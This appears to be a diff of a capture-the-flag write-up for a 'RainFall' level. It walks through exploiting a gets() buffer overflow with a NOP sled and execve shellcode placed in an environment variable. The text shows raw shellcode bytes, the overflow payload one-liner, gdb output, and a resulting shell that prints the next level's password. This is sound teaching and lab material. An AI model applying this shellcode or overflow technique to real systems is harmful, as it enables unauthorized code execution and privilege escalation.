@@ -1,31 +1,44 @@
-disassembly of the main gives:
-0x08048480      55             push ebp
-0x08048481      89e5           mov ebp, esp
-0x08048483      83e4f0         and esp, 0xfffffff0
-0x08048486      83ec50         sub esp, 0x50
-0x08048489      8d442410       lea eax, [s]
-0x0804848d      890424         mov dword [esp], eax        ; char *s
-0x08048490      e8abfeffff     call sym.imp.gets           ;[3] ; char *gets(char *s)
-0x08048495      c9             leave
-0x08048496      c3             ret
+08048480 <main>:
+ 8048480:	55                   	push   ebp
+ 8048481:	89 e5                	mov    ebp,esp
+ 8048483:	83 e4 f0             	and    esp,0xfffffff0
+ 8048486:	83 ec 50             	sub    esp,0x50
+ 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
+ 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
+ 8048495:	c9                   	leave  
+ 8048496:	c3                   	ret    
+
 
 `gets` is called, which is unsafe, we can just overwrite the stack so that the ret returns on some address containing a shellcode.
 
-so:
-(This is some shellcode)
-echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" > /tmp/shellcode
+
+We assemble our shellcode:
+nasm ./ressources/shellcode.asm
+[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level1/flag | clipboard ; scp -P 4242 ./ressources/shellcode level1@rainfall:/tmp
 
 (we put our shellcode in our environment, we also prepend it with a NOP slide to make it easier)
-export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 50000)'``cat shellcode`"
+export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 50000)'``cat /tmp/shellcode`"
 
 go get the rough estimate of the position of the environment in the address space of the program:
-(in gdb)
-start
-print getenv("SHELLCODE")
+level1@RainFall:~$ gdb ./level1
+[Removed for readability]
+(gdb) start
+Temporary breakpoint 1 at 0x8048483
+Starting program: /home/user/level1/level1 
 
-We now can create some file, containing multiple times this address encoded in binary, that will be given as STDIN to the program:
+Temporary breakpoint 1, 0x08048483 in main ()
+(gdb) print/x getenv("SHELLCODE")
+$1 = 0xbfff359f
 
-python -c 'import sys; sys.stdout.write(<Address in hexa form> * 22)' > /tmp/input
-cat /tmp/input - | ./level1
+We now can create some file, containing multiple times this address (with some offset to ensure jumping in the nop slide) encoded in binary, that will be given as STDIN to the program.
+The gets() will then read too much on the stack, putting our address in the popping position for the ret instruction: 
 
-The gets will then read too much on the stack, putting our address in the popping position for the ret instruction.
+
+[python -c 'import sys; sys.stdout.write(<Address in hexa form> * 22) ; sys.stdout.write("\n");' > /tmp/input]
+level1@RainFall:~$ python -c 'import sys; sys.stdout.write("\x9f\x45\xff\xbf" * 22) ; sys.stdout.write("\n");' > /tmp/input
+level1@RainFall:~$ cat /tmp/input - | ./level1 
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
